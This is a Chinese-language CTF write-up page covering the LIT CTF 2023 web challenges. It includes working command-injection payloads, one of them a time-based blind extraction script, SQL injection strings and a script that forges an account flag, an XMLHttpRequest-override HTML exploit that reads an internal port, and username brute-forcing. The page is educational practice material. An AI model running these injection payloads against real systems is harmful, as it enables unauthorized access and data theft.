<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lexington Informatics Tournament CTF 2023 &mdash; CTF 0.0 documentation</title>
      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../../_static/jquery.js?v=5d32c60e"></script>
        <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=44496db0"></script>
        <script src="../../_static/doctools.js?v=888ff710"></script>
        <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="TAMUctf 2023" href="tamu.html" />
    <link rel="prev" title="MirRoR4s’s CTF" href="../../index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../index.html" class="icon icon-home">
            CTF
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">CTF</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="current reference internal" href="#">Lexington Informatics Tournament CTF 2023</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#web">WEB</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#my-boss-left">My boss left</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id1">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#unsecure">unsecure</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id2">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#ping-pong">Ping Pong</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id3">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#amogsus-api">amogsus-api</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id4">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#license-inject">license-inject</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id5">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#ping-pong-under-maintenance">Ping Pong: Under Maintenance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id6">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#fetch">fetch</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id7">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#too-much-kirby">too much kirby</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id8">题目分析</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#art-contest">Art Contest</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id9">引用</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="tamu.html">TAMUctf 2023</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">CTF</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Lexington Informatics Tournament CTF 2023</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/source/2023/Lexington-Informatics-Tournament.md.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="lexington-informatics-tournament-ctf-2023">
<h1>Lexington Informatics Tournament CTF 2023<a class="headerlink" href="#lexington-informatics-tournament-ctf-2023" title="Permalink to this heading"></a></h1>
<ul class="simple">
<li><p><a class="reference external" href="https://lit.lhsmathcs.org/ctfchal">LIT - Challenges (lhsmathcs.org)</a></p></li>
<li><p><a class="reference external" href="https://discord.com/channels/738848412912451695/738849469113696267">官方 discord</a></p></li>
</ul>
<section id="web">
<h2>WEB<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
<section id="my-boss-left">
<h3>My boss left<a class="headerlink" href="#my-boss-left" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>My boss left… Guess I can be a bit more loose on checking people.
http://litctf.org:31784/</p>
<section id="id1">
<h4>题目分析<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h4>
<p>签到题目，源码中已给出了密码，直接登录就可以拿到 flag。具体 wp 可参看同名文件夹。</p>
</section>
</section>
<section id="unsecure">
<h3>unsecure<a class="headerlink" href="#unsecure" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>As it turns out, the admin who runs our website is quite insecure. They use password123 as their password.
(Wrap the flag in LITCTF{})
http://litctf.org:31776/</p>
<section id="id2">
<h4>题目分析<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
<p>感觉像是一个暴力破解用户名的题目，先试一下再说。从这位<a class="reference external" href="https://github.com/shadowabi/S-BlastingDictionary/blob/main/username.txt">大哥</a>处拿到用户名字典。之后用 burp 的 intruder 模块来做就可以。</p>
<p>发现是 admin，之前我试过的，但是复制密码的时候出错了…</p>
<p>一路跳转，最后发现有一个类似于 flag 的路径，提交然后成功了，属实没想到。。</p>
<p><img alt="image-20230821102635042" src="../../_images/image-20230821102635042.png" /></p>
</section>
</section>
<section id="ping-pong">
<h3>Ping Pong<a class="headerlink" href="#ping-pong" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>I made this cool website where you can ping other websites!</p>
<section id="id3">
<h4>题目分析<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
<p>一个简单的命令注入，表单提交 hostname 就好。</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>./flag.txt
</pre></div>
</div>
</section>
</section>
<section id="amogsus-api">
<h3>amogsus-api<a class="headerlink" href="#amogsus-api" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>I’m working on this new api for the awesome game amogsus
You can try it out here:http://litctf.org:31783/</p>
<p>There seems to be a vulnerability I missed though…</p>
<section id="id4">
<h4>题目分析<a class="headerlink" href="#id4" title="Permalink to this heading"></a></h4>
<p>一个 sqlite3 注入的题目，在 /account/update 路由处没有进行参数的过滤，所以可以通过 sql 注入将 sus 改为 true，然后再去访问 /flag 就可以获得 flag了。记得先注册一下！</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">K8ZH302X2NC3YDX6UIE571EG1QPU8RNP5MBBM0UZ</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">test1</span><span class="s2">&quot;, sus=1#</span>
</pre></div>
</div>
<p>token 的时效太短了，可能必须要用脚本来做。还要注意要在 password 注入，因为后面访问 /flag 时要用到 username。</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://litctf.org:31783/&quot;</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;username&quot;</span> <span class="p">:</span> <span class="s2">&quot;test1&quot;</span><span class="p">,</span>
        <span class="s2">&quot;password&quot;</span> <span class="p">:</span> <span class="s2">&quot;test1&quot;</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">auth</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s2">&quot;token&quot;</span><span class="p">]</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">auth</span><span class="p">)</span>
    
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;更新账户&quot;</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;username&quot;</span> <span class="p">:</span> <span class="s2">&quot;test1&quot;</span><span class="p">,</span>
        <span class="s2">&quot;password&quot;</span> <span class="p">:</span> <span class="s2">&quot;test1</span><span class="se">\&quot;</span><span class="s2">,sus=1--&quot;</span>
    <span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;Authorization&quot;</span> <span class="p">:</span> <span class="n">auth</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;account/update&quot;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;获得flag&quot;</span><span class="p">)</span>
    
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;flag&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</pre></div>
</div>
</section>
</section>
<section id="license-inject">
<h3>license-inject<a class="headerlink" href="#license-inject" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>i did a thing</p>
<section id="id5">
<h4>题目分析<a class="headerlink" href="#id5" title="Permalink to this heading"></a></h4>
<p>源码很长，是一个 TypeScirpt 的。然后做的事情是用 OCR 扫描图片提取文本，之后有一个 sqlite 的数据库操作。</p>
<p>~~源码还看不太懂，跟着 gpt 慢慢来。~~大概看懂了，flag 在数据库的某个表里面，代码有执行一个查询操作，不过是根据车牌号来查的，flag 就是这个车牌的金额。</p>
<p>打开题目是让我传一个仅包含文本的车牌图片，然后它会识别车牌，告诉我这个车牌对应的一些信息。糟糕的点是 flag 的车牌号是随机生成的，看上去没办法直接获得 flag。难道说代码的随机数生成是有问题的吗？或许这是一个值得思考的点。</p>
<p>emmm，我没有注意到 select 的时候没有对参数进行过滤，所以这实际上是一个简单的 sqlite 注入。</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>`SELECT * FROM plates WHERE plate = &quot;${text}&quot;`
</pre></div>
</div>
<p>text 变量就是上传的图片含有的文字，在这里我们让 text 为 None” OR name=”codetiger 就好，那这样实际上的 sqlite 语句就变为：</p>
<div class="highlight-sqlite notranslate"><div class="highlight"><pre><span></span>SELECT * FROM plates WHERE plate = &quot;None&quot; OR name=&quot;codetiger&quot;
</pre></div>
</div>
<p><img alt="image-20230822141916846" src="../../_images/image-20230822141916846.png" /></p>
<p>但是我比较奇怪的是，数据库中有 name=codetiger 的表项吗？后面看源码发现这个 codetiger 是 flag 对应的 name。</p>
<p><img alt="image-20230822142019191" src="../../_images/image-20230822142019191.png" /></p>
</section>
</section>
<section id="ping-pong-under-maintenance">
<h3>Ping Pong: Under Maintenance<a class="headerlink" href="#ping-pong-under-maintenance" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>The website seems to be under maintenance.</p>
<section id="id6">
<h4>题目分析<a class="headerlink" href="#id6" title="Permalink to this heading"></a></h4>
<p>依旧是无过滤的命令注入，但是这一次没有回显了。我想用带外的，但是题目说被禁掉了。</p>
<p>我尝试将 flag 重定向到别处，但是无法访问…</p>
<p>只剩下最后一种方法，那就是延迟注入，类似于 sql 盲注。</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>-h||if [ $(grep -r -h &#39;LITCTF{a&#39;) ]; then sleep 5; fi
</pre></div>
</div>
<p>利用 grep 命令递归地寻找 flag 字符串，-h 不打印文件路径和文件名。</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">charset</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span class="si">{}</span><span class="s1">_&#39;</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://34.130.180.82:59378/&quot;</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;LITCTF{&quot;</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;-h || if [ $(grep -r -h &#39;</span><span class="si">{</span><span class="n">flag</span><span class="o">+</span><span class="n">c</span><span class="si">}</span><span class="s2">&#39;) ]; then sleep 1.5; fi&quot;</span>
        
        <span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;hostname&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
        
        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">t</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>
    
    <span class="k">if</span> <span class="n">flag</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag recovered: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">break</span>
</pre></div>
</div>
</section>
</section>
<section id="fetch">
<h3>fetch<a class="headerlink" href="#fetch" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>fetch me the flag at http://litctf.org:31770/</p>
<section id="id7">
<h4>题目分析<a class="headerlink" href="#id7" title="Permalink to this heading"></a></h4>
<p>这个题目为什么好眼熟…..</p>
<p>思路也比较简单，根据源码可以知道访问 6969 端口就可以拿到 flag 文件，但是题目正常的业务逻辑仅仅只是访问了 6969 端口而并不会返回响应的 flag 文件：</p>
<p><img alt="image-20230822165657380" src="../../_images/image-20230822165657380.png" /></p>
<blockquote>
<div><p><code class="docutils literal notranslate"><span class="pre">newPage</span> <span class="pre">+</span> <span class="pre">goto</span> <span class="pre">打开我们上传的</span> <span class="pre">html</span> <span class="pre">页面</span></code></p>
<p><code class="docutils literal notranslate"><span class="pre">evaluate</span> <span class="pre">在打开的页面中执行</span> <span class="pre">js</span></code></p>
</div></blockquote>
<p>面对这种情况，有一个很神奇的做法，就是像 js 原型链污染那样去修改 XMLHTTPRequest 的原型，让其的 open 和 send 能够访问 6969 端口并输出 flag 文件的内容。exp 如下：</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;h&quot;</span><span class="p">&gt;</span>test<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span>
<span class="w">                </span><span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
<span class="w">                </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">txt</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;h&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">txt</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(.{10})/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;$1\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;**DONE**&quot;</span><span class="p">)</span>

<span class="w">            </span><span class="c1">//document.getElementById(&quot;h&quot;).innerHTML = args[1].replace(/(.{10})/g, &#39;$1\n&#39;) + &quot;    done&quot;;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">}</span>

<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>

<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>以上是核心的 exp，现在编写 python脚本进行全部的处理：</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://litctf.org:31770/runHTML&quot;</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./exp.html&quot;</span><span class="p">,</span><span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;file&quot;</span> <span class="p">:</span> <span class="p">(</span><span class="s2">&quot;exp.html&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="s1">&#39;text/html&#39;</span><span class="p">)}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
        <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">ans</span><span class="p">))</span>
        <span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&quot;flag.png&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;check!&quot;</span><span class="p">)</span>
    
    

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</pre></div>
</div>
<p><img alt="image-20230822171346213" src="../../_images/image-20230822171346213.png" /></p>
</section>
</section>
<section id="too-much-kirby">
<h3>too much kirby<a class="headerlink" href="#too-much-kirby" title="Permalink to this heading"></a></h3>
<p><strong>题目描述</strong></p>
<p>literally every single unused web chal jammed into one kirby-sized package (horrible painful amalgamation)</p>
<section id="id8">
<h4>题目分析<a class="headerlink" href="#id8" title="Permalink to this heading"></a></h4>
<p><strong>非预期：</strong></p>
<p>/challenge5 上传文件就可以拿到 flag，这里需要绕过一下前端的后缀名检测。</p>
<p><img alt="image-20230822233536241" src="../../_images/image-20230822233536241.png" /></p>
<p>预期解当然就是绕过前四关然后拿到 flag，这里第三关我暂时没想出来如何绕过。等待wp中….</p>
</section>
</section>
<section id="art-contest">
<h3>Art Contest<a class="headerlink" href="#art-contest" title="Permalink to this heading"></a></h3>
<p><a class="reference external" href="https://blog.junron.dev/writeups/web/art-contest.html">Art Contest | Jro’s Blog (junron.dev)</a></p>
</section>
</section>
<section id="id9">
<h2>引用<a class="headerlink" href="#id9" title="Permalink to this heading"></a></h2>
<p><a class="reference external" href="https://nolliv22.com/categories/lit-ctf-2023/">LIT CTF 2023 | Nolliv22</a></p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../../index.html" class="btn btn-neutral float-left" title="MirRoR4s’s CTF" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="tamu.html" class="btn btn-neutral float-right" title="TAMUctf 2023" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2023, MirRoR4s.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>